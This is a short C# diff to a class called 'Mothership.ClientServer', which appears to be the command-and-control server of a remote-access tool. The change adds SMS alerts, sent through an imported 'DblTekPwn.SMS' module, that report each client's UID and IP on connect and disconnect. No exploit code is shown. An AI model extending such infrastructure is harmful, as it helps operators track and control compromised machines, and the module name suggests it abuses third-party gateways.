@@ -5,6 +5,8 @@ using System.Security.Cryptography.X509Certificates;
 using System.Text;
 using System.Threading;
 
+using DblTekPwn.SMS;
+
 using Mothership.Crypto;
 using Mothership.Networking;
 
@@ -23,6 +25,11 @@ namespace Mothership.ClientServer
         private byte[] aesKey;
         private byte[] aesIV;
 
+        private string smsServer;
+        private int smsPort;
+        private int smsSimNumber;
+        private string[] smsNums;
+
         public ClientServer(int port, X509Certificate certificate)
         {
             server = new TcpServer(port, certificate);
@@ -30,11 +37,21 @@ namespace Mothership.ClientServer
 
             aesKey = AES.Generate16ByteArrayFromSeed(CRYPTO_KEY_SEED);
             aesIV = AES.Generate16ByteArrayFromSeed(CRYPTO_IV_SEED);
+
+            smsServer = string.Empty;
         }
 
         public void Disconnect(TcpClient client)
         {
             server_clientDisconnected(null, new ClientDisconnectedEventArgs(client));
+        }
+
+        public void RegisterSmsNumbers(string smsServer, int smsPort, int smsSimNum, params string[] nums)
+        {
+            this.smsServer = smsServer;
+            this.smsPort = smsPort;
+            this.smsSimNumber = smsSimNum;
+            smsNums = nums;
         }
 
         private bool sendingCommand = false;
@@ -74,6 +91,16 @@ namespace Mothership.ClientServer
             byte[] respEncrypted = Convert.FromBase64String(client.ReadLine());
             byte[] respData = AES.Decrypt(aesKey, aesIV, respEncrypted);
             return ASCIIEncoding.ASCII.GetString(respData);
+        }
+
+        public void SendSmsMessage(string msgf, params object[] args)
+        {
+            if (smsServer == string.Empty)
+                return;
+            if (args.Length == 0)
+                SmsSender.SendSms(smsServer, smsPort, smsNums, msgf, smsSimNumber, smsSimNumber);
+            else
+                SmsSender.SendSms(smsServer, smsPort, smsNums, string.Format(msgf, args), smsSimNumber, smsSimNumber);
         }
 
         public void Start()
@@ -127,6 +154,8 @@ namespace Mothership.ClientServer
 
             e.Client.PingThread = new Thread(() => pingThread(e.Client));
             e.Client.PingThread.Start();
+
+            SendSmsMessage("Client {0} connected from {1}", e.Client.UID, e.Client.IP);
         }
         private void server_clientDisconnected(object sender, ClientDisconnectedEventArgs e)
         {
@@ -139,6 +168,10 @@ namespace Mothership.ClientServer
             }
             catch
             { }
+            finally
+            {
+                SendSmsMessage("Client {0} disconnected.", e.Client.UID);
+            }
         }
     }
 }
